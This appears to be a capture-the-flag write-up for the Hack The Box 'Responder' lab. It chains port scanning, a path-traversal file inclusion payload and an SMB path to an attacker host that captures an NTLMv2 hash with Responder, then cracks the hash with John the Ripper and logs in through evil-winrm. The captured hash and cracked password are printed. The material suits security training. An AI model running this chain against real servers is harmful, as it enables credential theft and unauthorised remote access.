RESPONDER ROOM

found two open ports using sudo nmap -sV ip_addr -p- --min-rate 5000 to scan

port 80
port 5985-- which is a port to manage window hosts remotely using command line

website enumeration -- port 80

On opening Firefox and putting http://[target ip] , the browser returns a message about being unable to find that site. Looking in the URL bar, it now shows http://unika.htb. The website has redirected the browser to a new URL, and your host doesn't know how to find unika.htb. This webserver is employing name-based Virtual Hosting for serving the requests.
Name-Based Virtual hosting is a method for hosting multiple domain names (with separate handling of each name) on a single server. This allows one server to share its resources, such as memory and processor cycles, without requiring all the services to be used by the same hostname.
The web server checks the domain name provided in the Host header field of the HTTP request and sends a response according to that.

The /etc/hosts file is used to resolve a hostname into an IP address & thus we will need to add an entry in the /etc/hosts file for this domain to enable the browser to resolve the address for unika.htb 
echo "10.129.136.91 unika.htb" | sudo tee -a /etc/hosts

poking through the webpage unika.htb yielded nothing but we found a page= parameter when using the language option with the lang as a file
/index.php?page=french.html


File Inclusion Vulnerability

Dynamic websites include HTML pages on the fly using information from the HTTP request to include GET and POST parameters, cookies, and other variables. It is common for a page to "include" another page based on some of these parameters.
LFI or Local File Inclusion occurs when an attacker is able to get a website to include a file that was not intended to be an option for this application. A common example is when an application uses the path to a file as input. If the application treats this input as trusted, and the required sanitary checks are not performed on this input, then the attacker can exploit it by using the ../ string in the inputted file name and eventually view sensitive files in the local file system. In some limited cases, an LFI can lead to code execution as well.

RFI or Remote File Inclusion is similar to LFI but in this case it is possible for an attacker to load a remote file on the host using protocols like HTTP, FTP etc.
We test the page parameter to see if we can include files on the target system in the server response. We will test with some commonly known files that will have the same name across networks, Windows domains, and systems which can be found here ( https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt). One of the most common files that a penetration tester might attempt to access on a Windows machine to verify LFI is the hosts file, WINDOWS\System32\drivers\etc\hosts (this file aids in the local translation of host names to IP addresses). The ../ string is used to traverse back a directory, one at a time. Thus multiple ../ strings are included in the URL so that the file handler on the server traverses back to the base directory i.e. C:\ .

../../../../../../../../windows/system32/drivers/etc/hosts


Responder Challenge Capture

We know that this web page is vulnerable to the file inclusion vulnerability and is being served on a
Windows machine. Thus, there exists a potential for including a file on our attacker workstation. If we select
a protocol like SMB, Windows will try to authenticate to our machine, and we can capture the NetNTLMv2.
What is NTLM (New Technology Lan Manager)?
NTLM is a collection of authentication protocols created by Microsoft. It is a challenge-response
authentication protocol used to authenticate a client to a resource on an Active Directory domain.
It is a type of single sign-on (SSO) because it allows the user to provide the underlying authentication factor
only once, at login.
The NTLM authentication process is done in the following way :
1. The client sends the user name and domain name to the server.
2. The server generates a random character string, referred to as the challenge.
3. The client encrypts the challenge with the NTLM hash of the user password and sends it back to the
server.
4. The server retrieves the user password (or equivilent).
5. The server uses the hash value retrieved from the security account database to encrypt the challenge
string. The value is then compared to the value received from the client. If the values match, the client
is authenticated.
A more detailed explanation of the working of NTLM authentication can be found here.
NTLM vs NTHash vs NetNTMLv2
The terminology around NTLM authentication is messy, and even pros misuse it from time to time, so let's
get some key terms defined:
A hash function is a one way function that takes any amount of data and returns a fixed size value.
Typically, the result is referred to as a hash, digest, or fingerprint. They are used for storing passwords
more securely, as there's no way to convert the hash directly back to the original data (though there
are attacks to attempt to recover passwords from hashes, as we'll see later). So a server can store a
hash of your password, and when you submit your password to the site, it hashes your input, and
compares the result to the hash in the database, and if they match, it knows you supplied the correct
password.
An NTHash is the output of the algorithm used to store passwords on Windows systems in the SAM
database and on domain controllers. An NTHash is often referred to as an NTLM hash or even just an
NTLM, which is very misleading / confusing.
When the NTLM protocol wants to do authentication over the network, it uses a challenge / response
model as described above. A NetNTLMv2 challenge / response is a string specifically formatted to
include the challenge and response. This is often referred to as a NetNTLMv2 hash, but it's not actually
a hash. Still, it is regularly referred to as a hash because we attack it in the same manner. You'll see
NetNTLMv2 objects referred to as NTLMv2, or even confusingly as NTLM.

to get the password hash, we will use a responder [which is on kali by default] which captures the ntlm hash as a challenge is been sent

start responder
sudo responder -I [network interface]
sudo responder -I tun0

include on webpage through page parameter= //attacker-ip/mumufile

RESPONDER\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:3912cfd6a4c746e9:0AE9DE50D2EDC556AEA019D2E9F05501:0101000000000000003E5DF4F36ED901BFB697E0FE94F5140000000002000800520059004600410001001E00570049004E002D004600430058004700350033004C00520033003300350004003400570049004E002D004600430058004700350033004C0052003300330035002E0052005900460041002E004C004F00430041004C000300140052005900460041002E004C004F00430041004C000500140052005900460041002E004C004F00430041004C0007000800003E5DF4F36ED9010600040002000000080030003000000000000000010000000020000082D29D5B696C19D6489D6F2E460B418AB4553D05F911C6464D1E943C3C233EEA0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310035002E00310034000000000000000000

we got an hash back which can be cracked with john the ripper using the rockyou wordlists
copy and save the hash to a file
echo "hash" > hash.txt
now, use john the ripper to crack the hash
john -w=/usr/share/wordlists/rockyou.txt hash.txt

password successfully cracked
badminton        (Administrator) 

now connect to the winrm server using evil-winrm
evil-winrm -i ip_addr -u username -p passwd